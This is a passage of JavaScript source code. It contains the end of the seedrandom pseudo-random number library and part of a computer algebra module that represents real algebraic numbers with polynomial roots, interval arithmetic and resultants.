    me.i = i; me.j = j;
    return r;
    // For robust unpredictability, the function call below automatically
    // discards an initial batch of values.  This is called RC4-drop[256].
    // See http://google.com/search?q=rsa+fluhrer+response&btnI
  })(width);
}

//
// copy()
// Copies internal state of ARC4 to or from a plain object.
//
function copy(f, t) {
  t.i = f.i;
  t.j = f.j;
  t.S = f.S.slice();
  return t;
};

//
// flatten()
// Converts an object tree to nested arrays of strings.
//
function flatten(obj, depth) {
  var result = [], typ = (typeof obj), prop;
  if (depth && typ == 'object') {
    for (prop in obj) {
      try { result.push(flatten(obj[prop], depth - 1)); } catch (e) {}
    }
  }
  return (result.length ? result : typ == 'string' ? obj : obj + '\0');
}

//
// mixkey()
// Mixes a string seed into a key that is an array of integers, and
// returns a shortened string seed that is equivalent to the result key.
//
function mixkey(seed, key) {
  var stringseed = seed + '', smear, j = 0;
  while (j < stringseed.length) {
    key[mask & j] =
      mask & ((smear ^= key[mask & j] * 19) + stringseed.charCodeAt(j++));
  }
  return tostring(key);
}

//
// autoseed()
// Returns an object for autoseeding, using window.crypto and Node crypto
// module if available.
//
function autoseed() {
  try {
    var out;
    if (nodecrypto && (out = nodecrypto.randomBytes)) {
      // The use of 'out' to remember randomBytes makes tight minified code.
      out = out(width);
    } else {
      out = new Uint8Array(width);
      (global.crypto || global.msCrypto).getRandomValues(out);
    }
    return tostring(out);
  } catch (e) {
    var browser = global.navigator,
        plugins = browser && browser.plugins;
    return [+new Date, global, plugins, global.screen, tostring(pool)];
  }
}

//
// tostring()
// Converts an array of charcodes to a string
//
function tostring(a) {
  return String.fromCharCode.apply(0, a);
}

//
// When seedrandom.js is loaded, we immediately mix a few bits
// from the built-in RNG into the entropy pool.  Because we do
// not want to interfere with deterministic PRNG state later,
// seedrandom will not call math.random on its own again after
// initialization.
//
mixkey(math.random(), pool);

//
// Nodejs and AMD support: export the implementation as a module using
// either convention.
//
if ((typeof module) == 'object' && module.exports) {
  module.exports = seedrandom;
  // When in node.js, try using crypto package for autoseeding.
  try {
    nodecrypto = require('crypto');
  } catch (ex) {}
} else if ((typeof define) == 'function' && define.amd) {
  define(function() { return seedrandom; });
} else {
  // When included as a plain script, set up Math.seedrandom global.
  math['seed' + rngname] = seedrandom;
}


// End anonymous scope, and pass initial values.
})(
  // global: `self` in browsers (including strict mode and web workers),
  // otherwise `this` in Node and other environments
  (typeof self !== 'undefined') ? self : this,
  [],     // pool: entropy pool starts empty
  Math    // math: package containing random, pow, and seedrandom
);

})();
(function () {
"use strict";

 //TODO: ?

 //TODO: !?
// API:
// a class for real algebraic numbers
// Operations are implemented as described at https://en.wikipedia.org/wiki/Resultant#Number_theory
// "AbstractPolynomialRoot":
//  #toDecimal(precision)
//  #scale(k), k is an "algebraic expression constant"
//  #translate(k), k is an "algebraic expression constant"
//  #multiply(otherPolynomialRoot)
//  #add(otherPolynomialRoot)
//  #negate()
//  #inverse()
//  #sign()
//  #_pow(n), n is an integer
//  #_nthRoot(n), n is an integer
//  #equals(otherPolynomialRoot)
// PolynomialRoot implements AbstractPolynomialRoot - a basic class to represent real algebraic number exactly
//   .polynomial
//   .interval
// LazyPolynomialRoot implements AbstractPolynomialRoot - a class to represent real algebraic number as a rational expression (see https://en.wikipedia.org/wiki/Algebraic_expression )
//   .e
//   ._root
//TODO: remove references to Expression.ExpressionPolynomialRoot (?)
//Note: SimpleFloat is used only internally

function SimpleFloat(significand, exponent) {
  this.significand = significand;
  this.exponent = exponent;
}

SimpleFloat.create = function (e) {
  if (!isRational(e) || !isPowerOf2(e.getDenominator())) {
    throw new TypeError();
  }

  return new SimpleFloat(e.getNumerator(), 0 - (e.getDenominator().bitLength() - 1));
};

SimpleFloat.prototype.toExpression = function () {
  return this.significand.multiply(this.exponent >= 0 ? Expression.TWO._pow(this.exponent) : Expression.TWO._pow(-this.exponent).inverse());
};

SimpleFloat.prototype.multiply = function (other) {
  return new SimpleFloat(this.significand.multiply(other.significand), this.exponent + other.exponent);
};

SimpleFloat.prototype.add = function (other) {
  var min = Math.min(this.exponent, other.exponent);
  return new SimpleFloat(this.significand.leftShift(this.exponent - min).add(other.significand.leftShift(other.exponent - min)), min);
};

SimpleFloat.prototype.negate = function () {
  return new SimpleFloat(this.significand.negate(), this.exponent);
};

SimpleFloat.prototype.sign = function () {
  return this.significand.sign();
};

var isRational = function (e) {
  return e.getNumerator() instanceof Expression.Integer && e.getDenominator() instanceof Expression.Integer;
};

var isPowerOf2 = function (i) {
  return Expression.TWO._pow(i.bitLength() - 1).equals(i);
}; //Note: SimpleInterval is used only internally


function SimpleInterval(a, b) {
  if (!(a instanceof SimpleFloat) || !(b instanceof SimpleFloat) || a.add(b.negate()).sign() > 0) {
    throw new TypeError();
  }

  this.a = a;
  this.b = b;
}

SimpleInterval.from = function (interval) {
  return new SimpleInterval(SimpleFloat.create(interval.a), SimpleFloat.create(interval.b));
};

SimpleInterval.prototype.toExpressionsInterval = function () {
  return {
    a: this.a.toExpression(),
    b: this.b.toExpression()
  };
};

SimpleInterval.prototype.negate = function () {
  return new SimpleInterval(this.b.negate(), this.a.negate());
};

SimpleInterval.prototype.add = function (other) {
  return new SimpleInterval(this.a.add(other.a), this.b.add(other.b));
};

SimpleInterval.prototype.multiply = function (other) {
  var sign = function (e) {
    return e.sign();
  };

  var f = function (a, b, c, d) {
    return new SimpleInterval(a.multiply(b), c.multiply(d));
  };

  var x1 = this.a;
  var x2 = this.b;
  var y1 = other.a;
  var y2 = other.b;
  var sx1 = sign(x1);
  var sx2 = sign(x2);
  var sy1 = sign(y1);
  var sy2 = sign(y2);

  if (sx1 >= 0) {
    if (sy1 >= 0) {
      return f(x1, y1, x2, y2);
    }

    if (sy2 <= 0) {
      return f(x2, y1, x1, y2);
    } // y1 < 0 && y2 > 0


    return f(x2, y1, x2, y2);
  }

  if (sx2 <= 0) {
    if (sy2 <= 0) {
      return f(x2, y2, x1, y1);
    }

    if (sy1 >= 0) {
      return f(x1, y2, x2, y1);
    } // y1 < 0 && y2 > 0


    return f(x1, y2, x1, y1);
  }

  if (sy1 >= 0) {
    // x1 < 0 && x2 > 0
    return f(x1, y2, x2, y2);
  }

  if (sy2 <= 0) {
    // x1 < 0 && x2 > 0
    return f(x2, y1, x1, y1);
  } //TODO: add a test


  var a = x1.multiply(y1);
  var b = x2.multiply(y1);
  var c = x1.multiply(y2);
  var d = x2.multiply(y2);

  var min = function (a, b) {
    return a.subtract(b).sign() < 0 ? a : b;
  };

  var max = function (a, b) {
    return a.subtract(b).sign() < 0 ? b : a;
  };

  var from = min(min(a, b), min(c, d));
  var to = max(max(a, b), max(c, d));
  return new SimpleInterval(from, to);
};

SimpleInterval.prototype.scale = function (s) {
  return this.multiply(SimpleInterval.from({
    a: s,
    b: s
  })); //TODO: ?
};

SimpleInterval.prototype.inverse = function (precision) {
  var sign = function (e) {
    return e.sign();
  };

  if (sign(this.a) < 0 && sign(this.b) > 0) {
    throw new TypeError();
  }

  if (precision == undefined) {
    debugger;
    throw new TypeError();
  }

  var that = this.toExpressionsInterval(); //!TODO: REMOVE

  var s = Expression.TWO._pow(precision + Math.max(that.b.getNumerator().abs().bitLength(), that.a.getNumerator().abs().bitLength()));

  var div = function (a, b, roundingMode) {
    if (roundingMode === 'floor') {
      if (b.sign() < 0) {
        a = a.negate();
        b = b.negate();
      }

      return a.sign() >= 0 ? a.truncatingDivide(b) : a.add(Expression.ONE).truncatingDivide(b).subtract(Expression.ONE);
    }

    if (roundingMode === 'ceil') {
      return div(a.negate(), b, 'floor').negate();
    }

    throw new TypeError();
  };

  var f = function (s, x, roundingMode) {
    return div(s, x.getNumerator(), roundingMode).divide(s).multiply(x.getDenominator());
  };

  return SimpleInterval.from({
    a: f(s, that.b, 'floor'),
    b: f(s, that.a, 'ceil')
  });
};

SimpleInterval.prototype._pow = function (n) {
  if (n % 2 === 0) {
    if (n === 0) {
      return SimpleInterval.from({
        a: Expression.ONE,
        b: Expression.ONE
      });
    }

    return this.multiply(this)._pow(n / 2);
  }

  return new SimpleInterval(this.a._pow(n), this.b._pow(n));
};

SimpleInterval.prototype.toString = function () {
  return '[' + this.a.toString() + ';' + this.b.toString() + ']';
};

var intersection = function (a, b) {
  var cmp = function (x1, x2) {
    return x1.subtract(x2).getNumerator().sign();
  };

  var max = function (x1, x2) {
    return cmp(x1, x2) < 0 ? x2 : x1;
  };

  var min = function (x1, x2) {
    return cmp(x1, x2) < 0 ? x1 : x2;
  }; // https://scicomp.stackexchange.com/a/26260


  if (cmp(b.a, a.b) > 0 || cmp(a.a, b.b) > 0) {
    return null;
  }

  return {
    a: max(a.a, b.a),
    b: min(a.b, b.b)
  };
}; // TODO:


var toSimpleInterval = function (e, precision) {
  // precision - precision of the computation (?)
  if (e instanceof Expression.Integer) {
    return SimpleInterval.from({
      a: e,
      b: e
    });
  } else if (e instanceof Expression.BinaryOperation) {
    var a = toSimpleInterval(e.a, precision);
    var b = toSimpleInterval(e.b, precision);
    var s = e.getS();

    if (s === "+") {
      return a.add(b);
    } else if (s === "-") {
      return a.add(b.negate());
    } else if (s === "*") {
      return a.multiply(b);
    } else if (s === "/") {
      //- why was it commented out - ?
      return a.multiply(b.inverse(precision));
    } else if (s === "^") {
      if (e.b instanceof Expression.Integer) {
        var n = e.b.toBigInt();
        return a._pow(n);
      }
    } else {
      debugger;
    }
  } else if (e instanceof Expression.NthRoot) {
    var n = e.n;
    console.assert(n >= 2 && n % 1 === 0);

    if (e.a instanceof Expression.Integer && e.a.sign() > 0) {
      var a = e.a;

      var scale = Expression.TWO._pow(precision);

      var numerator = a.multiply(scale._pow(n))._integerNthRoot(n); //TODO: FIX


      return SimpleInterval.from({
        a: numerator.divide(scale),
        b: numerator.add(Expression.ONE).divide(scale)
      });
    }

    var a = toSimpleInterval(e.a, precision);

    if (n % 2 === 0) {
      //TODO: !?!?!
      var i = 2;

      while (a.a.sign() < 0 && a.b.sign() > 0) {
        a = toSimpleInterval(e.a, precision * i);
        i *= 2;
      }
    }

    var f = function (x, n, rounding) {
      var scale = Expression.TWO._pow(precision);

      var e = rounding === 'floor' ? x.getNumerator().sign() >= 0 ? Expression.ZERO : Expression.ONE.negate() : x.getNumerator().sign() < 0 ? Expression.ZERO : Expression.ONE;
      return x.getNumerator().multiply(x.getDenominator()._pow(n - 1)).multiply(scale._pow(n))._integerNthRoot(n).add(e).divide(scale.multiply(x.getDenominator()));
    };

    a = a.toExpressionsInterval(); //TODO: !?

    return SimpleInterval.from({
      a: f(a.a, n, 'floor'),
      b: f(a.b, n, 'ceil')
    });
  } else {}

  if (e instanceof PolynomialRoot) {
    return SimpleInterval.from(e.toDecimal(precision));
  } //TODO: REMOVE(?)


  if (e instanceof Expression.PolynomialRootSymbol) {
    return SimpleInterval.from(e.toDecimal(precision));
  }

  if (e instanceof Expression.ExpressionPolynomialRoot) {
    return SimpleInterval.from(e.root.toDecimal(precision));
  }

  debugger;
  throw new TypeError("?");
};

function Helper(polynomial) {
  this.squareFreeFactors = [];
  var tmp = null;
  var ONE = Polynomial.of(Expression.ONE);

  do {
    tmp = polynomial.squareFreeFactors();

    if (!tmp.a1.equals(ONE)) {
      //TODO: ?
      this.squareFreeFactors.push(tmp.a1);
    }

    if (tmp.a0.getDegree() !== 0) {
      polynomial = tmp.a0;
    } else {
      polynomial = null;
    }
  } while (polynomial != null);
}

Helper.prototype.calcAt = function (point) {
  var result = Expression.ONE;

  for (var iteratorfactor = this.squareFreeFactors[globalThis.Symbol.iterator](), factor = iteratorfactor.next().value; factor != null; factor = iteratorfactor.next().value) {
    result = result.multiply(factor.calcAt(point));
  }

  return result;
};

Helper.prototype.numberOfRoots = function (interval) {
  var result = 0;
  var newFactors = [];

  for (var iteratorfactor = this.squareFreeFactors[globalThis.Symbol.iterator](), factor = iteratorfactor.next().value; factor != null; factor = iteratorfactor.next().value) {
    var n = factor.numberOfRoots(interval.toExpressionsInterval());
    result += n;

    if (n > 0) {
      newFactors.push(factor);
    }
  }

  this.squareFreeFactors = newFactors;
  return result;
};

Helper.get = function (that, interval) {
  //TODO: do not call twice
  //for (var iteratorfactor = that.squareFreeFactors[globalThis.Symbol.iterator](), factor = iteratorfactor.next().value; factor != null; factor = iteratorfactor.next().value) {
  //  if (factor.numberOfRoots(interval) > 0) {
  //    return factor;
  //  }
  //}
  //return null;
  return that.squareFreeFactors.length === 1 ? that.squareFreeFactors[0] : null;
};

var calculateNewInterval = function (newPolynomial, zeroFunction) {
  if (!newPolynomial.hasIntegerCoefficients()) {
    throw new RangeError("just a check");
  }

  newPolynomial = new Helper(newPolynomial); //!?!?TODO: REMOVE

  var precision = 1;
  var guess = zeroFunction(precision);

  while (guess.a.sign() !== guess.b.sign() && !newPolynomial.calcAt(Expression.ZERO).equals(Expression.ZERO) || newPolynomial.numberOfRoots(guess) > 1) {
    precision *= 2;
    guess = zeroFunction(precision);
    if (precision > 1024) throw new Error(); //TODO: ?
  }

  var newInterval = guess;
  newPolynomial = Helper.get(newPolynomial, guess);
  return new PolynomialRoot(newPolynomial, newInterval.toExpressionsInterval());
};

function PolynomialRoot(polynomial, interval, options) {
options = options == undefined ?  {} : options;

  if (!polynomial.hasIntegerCoefficients()) {
    throw new TypeError();
  }

  if (polynomial.getLeadingCoefficient().sign() < 0) {
    return new PolynomialRoot(polynomial.negate(), interval);
  }

  var content = polynomial.getContent();

  if (!content.equals(Expression.ONE)) {
    return new PolynomialRoot(polynomial.scale(content.inverse()), interval);
  }

  if (!options.skipFactorization) {
    //!
    var factor = polynomial.factorize(); //TODO: pass the zero to help the factorization to return the correct factor:
    // var factor = polynomial.factorize({zero: new PolynomialRoot(polynomial, interval)});

    if (factor != null && !factor.equals(polynomial)) {
      if (factor.numberOfRoots(interval) !== 0) {
        return new PolynomialRoot(factor, interval);
      } else {
        var otherFactor = polynomial.divideAndRemainder(factor, "throw").quotient;
        return new PolynomialRoot(otherFactor, interval);
      }
    }
  }

  if (interval instanceof SimpleInterval) {
    throw new TypeError();
  }

  if (interval.a.subtract(interval.b).getNumerator().sign() > 0) {
    throw new TypeError();
  } // how to represent zero - ?
  //if ((interval.a.getNumerator().sign() || interval.b.getNumerator().sign()) !== (interval.b.getNumerator().sign() || interval.a.getNumerator().sign())) {
  //  throw new TypeError();
  //}


  if (!options.skipFactorization) {
    //!
    if (polynomial.numberOfRoots(interval) !== 1) {
      throw new TypeError();
    }
  }

  if (!polynomial.getContent().equals(Expression.ONE)) {
    throw new TypeError();
  } //TODO: factorization


  this.polynomial = polynomial; //TODO: https://www.wolframalpha.com/input/?i=x**5%2B7x**3%2Bx**2%2Bx%2B1%3D0

  this.interval = interval;
}

PolynomialRoot.prototype.toDecimal = function (precision) {
  return this.polynomial.getZero(this.interval, precision);
};

PolynomialRoot.prototype.toString = function () {
  // for debugging (?)
  return "[root of " + this.polynomial + " near " + this.interval.a.add(this.interval.b).divide(Expression.TWO).toString() + "]";
}; //TODO: remove (?)


PolynomialRoot.prototype.scale = function (k) {
  //console.assert(k instanceof Expression.Integer || isRational(k));
  // z = k * x, x = z / k
  var newPolynomial = this.polynomial._scaleRoots(k).primitivePart();

  if (!isRational(k)) {
    // TODO: remove
    var root = this;
    newPolynomial = toPolynomialWithIntegerCoefficients(newPolynomial);
    return calculateNewInterval(newPolynomial, function (precision) {
      return toSimpleInterval(root, precision).multiply(toSimpleInterval(k, precision));
    });
  } //TODO: clean up


  if (!isPowerOf2(k.getDenominator())) {
    // to have interval ends of the form n*2**e
    var root = this;
    return calculateNewInterval(newPolynomial, function (precision) {
      return toSimpleInterval(root, precision).multiply(toSimpleInterval(k, precision));
    });
  }

  var newInterval = SimpleInterval.from(this.interval).scale(k).toExpressionsInterval();
  return new PolynomialRoot(newPolynomial, newInterval);
}; //TODO: remove (?)


PolynomialRoot.prototype.translate = function (k) {
  //console.assert(k instanceof Expression.Integer || isRational(k));//TODO: ???
  // z = x + k, x = z - k
  var newPolynomial = this.polynomial._translateRoots(k).primitivePart(); // to avoid intervals, which include zero


  var root = this;
  var newInterval = null;

  if (!isRational(k)) {
    // TODO: remove
    newPolynomial = toPolynomialWithIntegerCoefficients(newPolynomial);
    return calculateNewInterval(newPolynomial, function (precision) {
      return toSimpleInterval(root, precision).add(toSimpleInterval(k, precision));
    });
  } // to avoid intervals, which include zero


  return calculateNewInterval(newPolynomial, function (precision) {
    return toSimpleInterval(root, precision).add(toSimpleInterval(k, precision));
  });
};

PolynomialRoot.prototype.multiply = function (other) {
  var that = this; //TODO: remove

  if (true) {
    var g = Math.gcd(that.polynomial.getGCDOfTermDegrees(), other.polynomial.getGCDOfTermDegrees());

    if (g > 1) {
      var tmp = that._pow(g).multiply(other._pow(g))._nthRoot(g); //TODO: TEST!!!


      if (g % 2 === 0 && that.sign() * other.sign() < 0) {
        tmp = tmp.negate();
      }

      return tmp;
    }
  } // z = x * y, y = z / x
  //TODO: variable names


  var $z = new Expression.Polynomial(Polynomial.of(Expression.ONE).shift(1));

  var toPInZ = function (c) { return new Expression.Polynomial(Polynomial.of(c)); };

  var second = other.polynomial._exponentiateRoots(-1).map(toPInZ)._scaleRoots($z);

  var newPolynomial = Polynomial.resultant(that.polynomial.map(toPInZ), second).polynomial.primitivePart();
  return calculateNewInterval(newPolynomial, function (precision) {
    return toSimpleInterval(that, precision).multiply(toSimpleInterval(other, precision));
  });
};

PolynomialRoot.prototype.add = function (other) {
  var that = this;

  if (that.polynomial.isEven() && that.polynomial.equals(other.polynomial) && that.equals(other.negate())) {
    return new PolynomialRoot(Polynomial.of(Expression.ONE).shift(1), {
      a: Expression.ONE.negate(),
      b: Expression.ONE
    });
  } // z = x + y, y = z - x
  //TODO: variable names


  var $z = new Expression.Polynomial(Polynomial.of(Expression.ONE).shift(1));

  var toPInZ = function (c) { return new Expression.Polynomial(Polynomial.of(c)); };

  var second = other.polynomial._scaleRoots(Expression.ONE.negate()).map(toPInZ)._translateRoots($z);

  var newPolynomial = Polynomial.resultant(that.polynomial.map(toPInZ), second).polynomial.primitivePart();
  return calculateNewInterval(newPolynomial, function (precision) {
    return toSimpleInterval(that, precision).add(toSimpleInterval(other, precision));
  });
}; //TODO: remove (?)


PolynomialRoot.prototype.negate = function () {
  return new PolynomialRoot(this.polynomial._scaleRoots(Expression.ONE.negate()), {
    b: this.interval.a.negate(),
    a: this.interval.b.negate()
  });
}; //TODO: remove (?)


PolynomialRoot.prototype.inverse = function () {
  // z = 1/y, y = 1/z
  var newPolynomial = this.polynomial._exponentiateRoots(-1);

  console.assert(this.interval.a.getNumerator().sign() === this.interval.b.getNumerator().sign());
  var that = this;
  return calculateNewInterval(newPolynomial, function (precision) {
    return toSimpleInterval(that, precision).inverse(precision);
  });
};

PolynomialRoot.prototype.sign = function () {
  if (this.polynomial.getCoefficient(0).equals(Expression.ZERO)) {
    if (this.interval.a.getNumerator().sign() <= 0 && this.interval.b.getNumerator().sign() >= 0) {
      return 0;
    }
  }

  if (this.interval.a.getNumerator().sign() >= 0) {
    return +1;
  }

  if (this.interval.b.getNumerator().sign() <= 0) {
    return -1;
  }

  throw new TypeError("should not happen");
};

PolynomialRoot.prototype._pow = function (n) {
  var pow = function (x, count, accumulator) {
    if (!(count >= 0)) {
      throw new RangeError();
    }

    if (count > Number.MAX_SAFE_INTEGER) {
      throw new RangeError("NotSupportedError");
    }

    return count < 1 ? accumulator : 2 * Math.floor(count / 2) !== count ? pow(x, count - 1, accumulator.multiply(x)) : pow(x._pow(2), Math.floor(count / 2), accumulator);
  };

  if (n === 0) {
    return new PolynomialRoot(Polynomial.of(Expression.ONE.negate(), Expression.ONE), SimpleInterval.from({
      a: Expression.ZERO,
      b: Expression.TWO
    })); // x-1=0
  }

  var g = Math.gcd(n, this.polynomial.getGCDOfTermDegrees());

  if (g === 1) {
    //return Expression.prototype._pow.call(this, n);//TODO: ?
    return pow(this, n - 1, this);
  }

  if (g < n) {
    return this._pow(g)._pow(n / g);
  } //TODO: faster method


  var newInterval = undefined;

  if (n % 2 === 0 && this.interval.b.getNumerator().sign() <= 0) {
    newInterval = {
      a: this.interval.b._pow(n),
      b: this.interval.a._pow(n)
    };
  } else {
    newInterval = {
      a: this.interval.a._pow(n),
      b: this.interval.b._pow(n)
    };
  } //TODO:


  return new PolynomialRoot(this.polynomial._exponentiateRoots(n), newInterval);
};

var $Î± = function () {
  return new Expression.Symbol('Î±'); //return new Expression.Polynomial(Polynomial.of(Expression.ONE).shift(1));
};

PolynomialRoot.prototype._nthRoot = function (n) {
  var newPolynomial = this.polynomial._exponentiateRoots(1 / n);

  var root = this;
  return calculateNewInterval(newPolynomial, function (precision) {
    //TODO: 
    //return root.toDecimal(precision).nthRoot(n);
    return toSimpleInterval(Expression.NthRoot.makeRoot(new Expression.ExpressionPolynomialRoot(new LazyPolynomialRoot(Polynomial.of(Expression.ZERO, Expression.ONE), Polynomial.of(Expression.ONE), root)), n), precision);
  });
};

PolynomialRoot.prototype.equals = function (other) {
  if (this === other) {
    return true;
  }

  if (this.polynomial.getDegree() !== other.polynomial.getDegree()) {
    return false;
  }

  if (this.polynomial.equals(other.polynomial) && this.interval.a.equals(other.interval.a) && this.interval.b.equals(other.interval.b)) {
    return true;
  }

  var i = intersection(this.interval, other.interval);

  if (i == null) {
    return false;
  }

  if (this.polynomial.equals(other.polynomial)) {
    var c = this.polynomial.numberOfRoots(i);

    if (c === 1) {
      return true;
    } else if (c === 0) {
      return false;
    }

    throw new TypeError();
  }

  if (Polynomial.polynomialGCD(this.polynomial, other.polynomial).getDegree() === 0) {
    return false;
  } //TODO: ?
  //return this.polynomial.equals(other.polynomial) && intersection(this.interval, other.interval) != null && this.add(other.negate()).equals(Expression.ZERO);


  var interval = this.add(other.negate()).interval;
  return interval.a.getNumerator().sign() <= 0 && interval.b.getNumerator().sign() >= 0;
};

PolynomialRoot._calculateNewInterval = calculateNewInterval; //TODO: remove

LazyPolynomialRoot._calculateNewInterval = calculateNewInterval; //TODO: remove

PolynomialRoot._toSimpleInterval = toSimpleInterval; //TODO: remove

LazyPolynomialRoot._toSimpleInterval = toSimpleInterval; //TODO: remove

var _isSimpleForUpgrade = function (e, root) {
  if (e instanceof Expression.Multiplication) {
    return true; //!?
  }

  if (e instanceof Expression.Addition && !(e.a instanceof Expression.Addition)) {
    return _isSimpleForUpgrade(e.a, root) && _isSimpleForUpgrade(e.b, root);
  } //TODO: other variants (?)


  return e.equals(root) || e instanceof Expression.Integer || e instanceof Expression.Complex || e instanceof Expression.NthRoot || e instanceof Expression.Exponentiation && _isSimpleForUpgrade(e.a, root) && e.b instanceof Expression.Integer || e instanceof Expression.Multiplication && _isSimpleForUpgrade(e.a, root) && _isSimpleForUpgrade(e.b, root) || e instanceof Expression.Division && _isSimpleForUpgrade(e.getNumerator(), root) && e.b instanceof Expression.Integer;
};

PolynomialRoot._isSimpleForUpgrade = _isSimpleForUpgrade;
LazyPolynomialRoot._isSimpleForUpgrade = _isSimpleForUpgrade;

function LazyPolynomialRoot(p1, p2, root) {
  //console.assert(e instanceof Expression && (e.getDenominator() instanceof Expression.Integer));//TODO: Expression.Polynomial (?)
  if (!(p1 instanceof Polynomial)) {
    throw new TypeError();
  }

  if (!(p2 instanceof Polynomial) || !(p2.getDegree() === 0)) {
    throw new TypeError();
  }

  if (!p1._testCoefficients(function (c) { return !(c instanceof Expression.Division); })) {
    throw new TypeError();
  }

  console.assert(root instanceof PolynomialRoot); //TODO:
  //console.assert(Expression.isRealAlgebraicNumber(e));
  //this.e = e; // internal symbolic expression with a "root" as a symbol

  this._p1 = p1;
  this._p2 = p2;
  this._root = root; //if (Math.random() < 1/1000) {
  //console.debug('LazyPolynomialRoot', p1.getDegree() < 0 ? 0 : p1._log2hypot());
  //}
}

LazyPolynomialRoot.prototype.toDecimal = function (precision) {
  var calcAt = function (polynomial, x, precision) {
    var result = toSimpleInterval(Expression.ZERO, precision);

    for (var i = polynomial.getDegree(); i >= 0; i--) {
      result = result.multiply(x);
      var tmp = toSimpleInterval(polynomial.getCoefficient(i), Math.max(1, precision)); //TODO: ?
      //if (tmp === "CANNOT_DIVIDE" || tmp == undefined) {
      //  return tmp;
      //}

      result = result.add(tmp);
    }

    return result;
  };

  var alphaValue = toSimpleInterval(this._root, precision);
  var p1 = this._p1;
  var p2 = this._p2;
  var a = calcAt(p1, alphaValue, precision); //if (a === "CANNOT_DIVIDE" || a == undefined) {
  //  return a;
  //}

  var b = calcAt(p2, alphaValue, precision); //if (b === "CANNOT_DIVIDE" || b == undefined) {
  //  return b;
  //}

  var result = a.multiply(b.inverse(precision)); //TODO: precision !!!

  return result.toExpressionsInterval();
};

LazyPolynomialRoot.prototype.toString = function () {
  return "[" + this.getAlphaExpression() + ", where " + this._root + "]"; // for debugging
};

function makeExpressionWithPolynomialRoot(p1, p2, root) {
  var v = root;

  if (true) {
    if (p2.getDegree() !== 0 || !(p2.getCoefficient(0) instanceof Expression.Integer)) {
      var p2Inv = p2.modularInverse(root.polynomial).primitivePart();
      var newDenominator = p2.multiply(p2Inv).divideAndRemainder(root.polynomial).remainder;

      if (p2.getDegree() > 0) {
        var c = newDenominator.getContent().getDenominator();
        return makeExpressionWithPolynomialRoot(p1.multiply(p2Inv).scale(c), newDenominator.scale(c), root);
      }
    }
  }

  var reduce = function (p1, p2) {
    if (!(p2.getLeadingCoefficient() instanceof Expression.Integer)) {
      var c = Expression.getConjugate(p2.getLeadingCoefficient());
      return reduce(p1.scale(c), p2.scale(c));
    } //var g = p1.shift(p2.getDegree() + 1).add(p2).getContent();


    var g = p1.getContent().gcd(p2.getContent());

    if (!g.equals(Expression.ONE)) {
      p1 = p1.scale(g.inverse());
      p2 = p2.scale(g.inverse());
    }

    return [p1, p2];
  }; //TODO: use cases - ?


  if (p1.equals(Polynomial.ZERO)) {
    return [Polynomial.ZERO, Polynomial.of(Expression.ONE)];
  }

  if (p1.getDegree() === 0 && p2.getDegree() === 0) {
    return reduce(p1, p2);
  } //!

  /*
    var c = function (x) {
      //!new 2020-08-27
      //TODO: remove
      //TODO: optimize
      //!new 2022-07-06 disabled as it is too slow and I do not know how to optimize it
      if (false &&
          !(x instanceof Expression.Integer) &&
          !(x instanceof Expression.Multiplication && x.a === Expression.I && x.b === v) &&
          !(x instanceof Expression.Exponentiation)) {
        var p1 = Polynomial.toPolynomial(x.subtract(new Expression.Symbol('$n')), variable);
        //var test = v.polynomial.divideAndRemainder(p1).remainder;
        if (p1.getDegree() >= v.polynomial.getDegree()) {
          p1 = Polynomial.pseudoRemainder(p1, v.polynomial);
        }
        var test = v.polynomial.getDegree() >= p1.getDegree() ? Polynomial.pseudoRemainder(v.polynomial, p1) : v.polynomial;
        if (test.getDegree() === 0) {
          //(x**2-2)(x**2+x-1) = 0
          var pn0 = Polynomial.toPolynomial(test.calcAt(Expression.ZERO).getNumerator(), new Expression.Symbol('$n'));
          var pn = Polynomial.toPolynomial(Expression.getConjugateExpression(test.calcAt(Expression.ZERO).getNumerator()), new Expression.Symbol('$n'));
          //pn = pn.scale(pn.getLeadingCoefficient().inverse());
          pn = pn.primitivePart();
          var tmp = pn.squareFreeFactors();
          var f = tmp.a0;
          if (tmp.a0.getDegree() === 0) {
            f = tmp.a1;
          }
          if (f.getDegree() <= 2) {//TODO: ?
            var roots = f.getroots();
            var c = [];
            var fractionDigits = 3;
            do {
              c.splice(0, c.length);
              for (var iteratorroot = roots[globalThis.Symbol.iterator](), root = iteratorroot.next().value; root != null; root = iteratorroot.next().value) {
                if (Expression.has(root, Expression.Complex) === Expression.has(x, Expression.Complex)) {
                  if (root.getNumerator().toMathML({rounding: {fractionDigits: fractionDigits}}) === new Expression.Multiplication(x, root.getDenominator()).toMathML({rounding: {fractionDigits: fractionDigits}})) {
                    c.push(root);
                  }
                }
              }
              fractionDigits *= 2;
            } while (c.length > 2);
            if (c.length === 1) {
              console.debug('c[0]:', c[0].toString());
              return c[0];
            }
          }
          var lc = pn.getLeadingCoefficient();
          //TODO: Expression.isConstant(x) is not working when x contains alpha (ExpressionPolynomialRoot)
          if (lc instanceof Expression.Integer && Expression.isConstant(x)) {//TODO: ? - this is a filter to avoid infinite computation
            var s = toDecimalStringInternal(x.multiply(lc), {fractionDigits: 0});
            var n = Number(s);//TODO: complex - ?
            if (!Number.isNaN(n)) {
              var q = Expression.Integer.fromString(s).divide(lc);
              if (pn.calcAt(q).equals(Expression.ZERO) && pn0.calcAt(q).equals(Expression.ZERO)) {
                var tmp = Expression.ONE.divide(Expression.TWO).divide(lc);
                var interval = {a: q.subtract(tmp), b: q.add(tmp)};
                if (pn.numberOfRoots(interval) === 1) {
                  console.debug('q.toString():', q.toString());
                  return q;
                }
                //TODO: ?
                //if (pn0.numberOfRoots(interval) === 1) {
                //  debugger;
                //  console.debug('q.toString():', q.toString());
                //  return q;
                //}
              }
            }
          }
        }
      }
      var px = Polynomial.toPolynomial(x, variable);
      if (false) {
        if (v.polynomial.getDegree() === 6 && v.polynomial.getCoefficient(1).equals(Expression.ZERO) && v.polynomial.getCoefficient(2).equals(Expression.ZERO) && v.polynomial.getCoefficient(4).equals(Expression.ZERO) && v.polynomial.getCoefficient(5).equals(Expression.ZERO)) {
          if (px.getDegree() >= 3) {
            var alpha = c(v._pow(3));
            var dv = Polynomial.of(alpha.negate(), Expression.ZERO, Expression.ZERO, Expression.ONE);
            return px.divideAndRemainder(dv).remainder.calcAt(variable);
          }
        }
      }
      //!
      return px.divideAndRemainder(v.polynomial).remainder.calcAt(variable);
    };
  */


  var c = function (p) {
    return p.divideAndRemainder(v.polynomial).remainder;
  };
  /*e = p1.calcAt(variable).divide(p2.calcAt(variable));
  var oldE = e;
  e = c(e.getNumerator()).divide(c(e.getDenominator()));
  if (!oldE.equals(e)) {
